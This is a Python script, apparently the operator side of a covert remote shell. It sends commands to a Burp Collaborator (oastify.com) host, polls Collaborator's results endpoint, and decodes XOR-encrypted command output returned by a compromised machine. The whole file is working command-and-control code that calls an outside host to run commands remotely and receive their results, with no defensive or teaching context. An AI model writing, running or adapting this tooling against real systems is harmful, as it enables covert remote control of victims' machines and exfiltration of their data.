from base64 import b64decode
from json import loads
from time import sleep
from requests import get, post
from sys import argv
import readline



HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en'
}
RNRN = b'\x0d\x0a\x0d\x0a'
LRNRN = len(RNRN)
SECONDS = 0.5



def decode(b64):

    return b64decode(b64)



def decrypt(data, key):

    return xor(data, key)



def fetch(biid):

    url = 'https://polling.oastify.com/burpresults'
    parameters = {'biid': biid}
    r = get(url, headers = HEADERS, params = parameters)
    return loads(r.text)



def receive(hostname, biid, key, command):

    commandb = ''
    maxTries = 0

    while command != commandb and maxTries < 10:

        content = fetch(biid)
        maxTries += 1

        if content:
            for e in content['responses']:
                if e['protocol'] == 'https':

                    requestToBC = b64decode(e['data']['request'])
                    pos = requestToBC.find(RNRN) + LRNRN

                    body = loads(requestToBC[pos:])

                    commandb = decrypt(decode(body['command']), key)
                    commandb = commandb.decode()

                    if command == commandb:
                        resultb = decrypt(decode(body['result']), key)
                        resultb = resultb.decode()
                        print(f'{resultb}')
                        break

        sleep(SECONDS)



def send(hostname, body):

    post(f'https://{hostname}', headers = HEADERS, data = body)



def shell(hostname, biid, key):

    command = input('> ')

    while True:
        send(hostname, {'command': command})
        if command != 'exit':
            receive(hostname, biid, key, command)
            command = input('> ')
        else:
            break



def xor(data, key):

    data = bytearray(data)
    key = key.encode()
    lk = len(key)
    for i in range(len(data)):
        data[i] = data[i] ^ key[i % lk]
    return bytes(data)



# Required arguments
hostname = argv[1] # hostname-1.oastify.com
biid = argv[2] # biid-2=
key = argv[3] # S3cr3tK3y



shell(hostname, biid, key)
